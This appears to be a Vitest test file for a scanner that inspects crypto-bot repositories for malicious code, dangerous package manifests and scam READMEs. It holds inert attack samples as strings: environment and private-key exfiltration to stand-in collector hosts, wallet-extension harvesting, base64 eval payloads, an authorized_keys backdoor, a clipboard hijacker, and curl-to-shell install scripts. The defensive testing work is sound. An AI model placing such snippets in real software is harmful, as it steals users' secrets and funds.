import { describe, expect, it } from "vitest";
import { scanCode } from "../src/analyzers/code";
import { analyzeManifests } from "../src/analyzers/manifest";
import { scanScamText } from "../src/analyzers/scam-text";
import type { SourceFile } from "../src/types";

// Inert samples: they are only ever scanned as text, never executed. Endpoints use the .invalid TLD.
const f = (path: string, text: string): SourceFile => ({ path, text, size: text.length });
const ids = (files: SourceFile[], installTime?: string[]) =>
  scanCode(files, { installTime: new Set(installTime) }).map((x) => `${x.id}:${x.severity}`);

const LEGIT_JS_BOT = `
import { Wallet, JsonRpcProvider } from "ethers";
import "dotenv/config";
const wallet = new Wallet(process.env.PRIVATE_KEY, new JsonRpcProvider(process.env.RPC_URL));
const secret = process.env.BINANCE_SECRET_KEY;
async function price() {
  const res = await fetch("https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT");
  return (await res.json()).price;
}
async function order(q) {
  const signature = crypto.createHmac("sha256", secret).update(q).digest("hex");
  return axios.post("https://api.binance.com/api/v3/order?" + q, null, { headers: { "X-MBX-APIKEY": process.env.BINANCE_API_KEY }, params: { signature: crypto.createHmac("sha256", process.env.BINANCE_SECRET_KEY).update(q).digest("hex") } });
}
async function alert(text) {
  await fetch(\`https://api.telegram.org/bot\${process.env.TG_TOKEN}/sendMessage\`, { method: "POST", body: JSON.stringify({ chat_id: 1, text }) });
}
`;

const LEGIT_PY_BOT = `
import os, requests
from web3 import Web3
from py_clob_client.client import ClobClient
key = os.getenv("PRIVATE_KEY")
client = ClobClient("https://clob.polymarket.com", key=key, chain_id=137)
def notify(msg):
    requests.post(f"https://api.telegram.org/bot{os.environ['TG_TOKEN']}/sendMessage", json={"chat_id": 1, "text": msg})
`;

describe("code rules: legitimate bots stay quiet", () => {
  it("does not flag a normal JS trading bot", () => {
    const out = scanCode([f("src/bot.js", LEGIT_JS_BOT)]);
    expect(out.filter((x) => x.severity === "critical" || x.severity === "high")).toEqual([]);
  });
  it("does not flag a normal Python bot", () => {
    const out = scanCode([f("bot.py", LEGIT_PY_BOT)]);
    expect(out.filter((x) => x.severity === "critical" || x.severity === "high")).toEqual([]);
  });
});

describe("code rules: malicious patterns", () => {
  it("flags private keys sent in a request body", () => {
    const sample = `const pk = process.env.PRIVATE_KEY;\nawait fetch("https://collector.example.invalid/k", { method: "POST", body: JSON.stringify({ k: process.env.PRIVATE_KEY }) });`;
    expect(ids([f("index.js", sample)])).toContain("code.secret-in-request:high");
  });

  it("flags env dumps sent to a collector as critical", () => {
    const sample = `const data = JSON.stringify(process.env);\nrequire("https").request({ host: "abc.oast.fun", method: "POST" }).end(data);`;
    expect(ids([f("lib/telemetry.js", sample)])).toContain("code.secrets-to-collector:critical");
  });

  it("flags wallet/browser harvesting plus network as critical", () => {
    const sample = `const p = path.join(home, "AppData/Local/Google/Chrome/User Data/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn");\nconst files = fs.readdirSync(p);\naxios.post("http://203.0.113.9:8080/u", files);`;
    const out = ids([f("src/sync.js", sample)]);
    expect(out).toContain("code.harvest-and-send:critical");
  });

  it("flags decode-and-eval payloads", () => {
    const blob = Buffer.from("console.log('payload would go here');".repeat(8)).toString("base64");
    const sample = `const s = Buffer.from("${blob}", "base64").toString();\neval(s);`;
    expect(ids([f("index.js", sample)])).toContain("code.decode-and-exec:high");
  });

  it("flags python exec(base64.b64decode(...))", () => {
    const sample = `import base64\nexec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))`;
    expect(ids([f("pkg/__init__.py", sample)])).toContain("code.py-exec-payload:high");
  });

  it("escalates findings in install-time files", () => {
    const sample = `import base64\nexec(base64.b64decode("cHJpbnQoJ2hlbGxvJyk="))`;
    expect(ids([f("setup.py", sample)], ["setup.py"])).toContain("code.py-exec-payload:critical");
  });

  it("flags SSH backdoors", () => {
    const sample = `fs.appendFileSync(path.join(os.homedir(), ".ssh", "authorized_keys"), KEY);`;
    expect(ids([f("postinstall.js", sample)])).toContain("code.ssh-backdoor:critical");
  });

  it("flags clipboard address swapping", () => {
    const sample = `const clip = require("clipboardy");\nsetInterval(() => { const t = clip.readSync(); if (/0x[a-fA-F0-9]{40}/.test(t)) clip.writeSync(ATTACKER); }, 500);`;
    expect(ids([f("main.js", sample)])).toContain("code.clipboard-hijacker:high");
  });

  it("flags balance sweeps to unknown hard-coded addresses but not to known routers", () => {
    const bad = `const bal = await provider.getBalance(wallet.address);\nawait wallet.sendTransaction({ to: "0x1111111111111111111111111111111111111111", value: bal - gasCost });`;
    expect(ids([f("bot.js", bad.replace("bal - gasCost", "balance - gasCost").replace("const bal", "const balance"))])).toContain("code.sweep-to-hardcoded:high");
    const router = `await wallet.sendTransaction({ to: "0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D", value: balance, data });`;
    expect(ids([f("bot.js", router)]).some((x) => x.startsWith("code.sweep-to-hardcoded"))).toBe(false);
  });

  it("downgrades findings in tests and examples", () => {
    const sample = `fs.appendFileSync(path.join(os.homedir(), ".ssh", "authorized_keys"), KEY);`;
    expect(ids([f("test/fixtures/backdoor.js", sample)])).toContain("code.ssh-backdoor:high");
  });

  it("ignores trusted installers piped to a shell", () => {
    expect(ids([f("install.sh", "curl -sSf https://sh.rustup.rs | sh")])).toEqual([]);
    expect(ids([f("install.sh", "curl -s https://evil.example.invalid/x | bash")])).toContain("code.download-and-run:high");
  });
});

describe("manifests", () => {
  it("flags dangerous install scripts and marks install-time files", () => {
    const pkg = f("package.json", JSON.stringify({ name: "x", scripts: { postinstall: "node scripts/setup.js && curl -s https://evil.example.invalid | sh" }, dependencies: { axios: "^1.6.0", "my-dep": "github:evil/dep" } }));
    const r = analyzeManifests([pkg]);
    expect(r.findings.map((x) => x.id)).toEqual(expect.arrayContaining(["manifest.install-script-download", "manifest.url-dependency"]));
    expect(r.installTime.has("scripts/setup.js")).toBe(true);
    expect(r.dependencies).toEqual([expect.objectContaining({ name: "axios", spec: "^1.6.0" })]);
  });

  it("reads lockfiles and requirements", () => {
    const lock = f("package-lock.json", JSON.stringify({ lockfileVersion: 3, packages: { "": {}, "node_modules/chalk": { version: "5.6.1" }, "node_modules/a/node_modules/@scope/b": { version: "1.0.0" } } }));
    const reqs = f("requirements.txt", "requests==2.32.3\nweb3>=7,<8  # comment\n--extra-index-url https://pkgs.evil.example/simple\n-e .\n");
    const r = analyzeManifests([lock, reqs]);
    expect(r.dependencies).toEqual(
      expect.arrayContaining([
        expect.objectContaining({ name: "chalk", version: "5.6.1" }),
        expect.objectContaining({ name: "@scope/b", version: "1.0.0" }),
        expect.objectContaining({ name: "requests", version: "2.32.3" }),
        expect.objectContaining({ name: "web3", spec: ">=7,<8" }),
      ]),
    );
    expect(r.findings.map((x) => x.id)).toContain("manifest.custom-index");
  });

  it("flags .pth autorun files", () => {
    const r = analyzeManifests([f("wheel/evil_init.pth", "import os; os.system('id')\n")]);
    expect(r.findings[0]).toMatchObject({ id: "manifest.pth-autorun", severity: "high" });
  });
});

describe("scam text", () => {
  it("catches the Remix/fund/start tutorial", () => {
    const md = `# MEV Bot 2026\n1. Open remix.ethereum.org and paste the contract.\n2. Deploy it, then send at least 0.5 ETH to the contract address.\n3. Click start() and watch the profits.\nGuaranteed profit of 5% daily!`;
    const out = scanScamText([f("README.md", md)]).map((x) => `${x.id}:${x.severity}`);
    expect(out).toEqual(expect.arrayContaining(["text.remix-fund-start:critical", "text.profit-promise:medium"]));
  });
  it("leaves a normal README alone", () => {
    const md = "# My bot\nCopy .env.example to .env and set PRIVATE_KEY for a fresh wallet. Run `npm start`.";
    expect(scanScamText([f("README.md", md)])).toEqual([]);
  });
});
